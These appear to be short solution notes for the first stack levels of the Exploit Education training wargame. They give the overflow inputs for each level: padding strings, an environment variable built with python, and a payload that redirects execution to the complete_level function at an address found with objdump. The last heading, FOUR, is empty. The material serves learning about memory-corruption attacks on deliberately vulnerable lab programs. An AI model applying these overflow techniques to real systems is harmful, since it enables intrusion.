## ZERO
run stack-zero
enter `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa` to buffer overflow the changeme
## ONE
./stack-one aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabYlI
## TWO
Run export ExploitEducation=`python -c 'print ("a" * 64 + "\x0a\x09\x0a\x0d")'`
This sets the environment variable to override changeme.
Then run stack-two
## THREE
`objdump -t stack-three` to get the symbol table. complete_level function is located at 000000000040069d. Then run the command to overflow and call the function:
echo `python -c 'print("a" * 64 + "\x9d\x06\x40\x00")'` | ./stack-three
## FOUR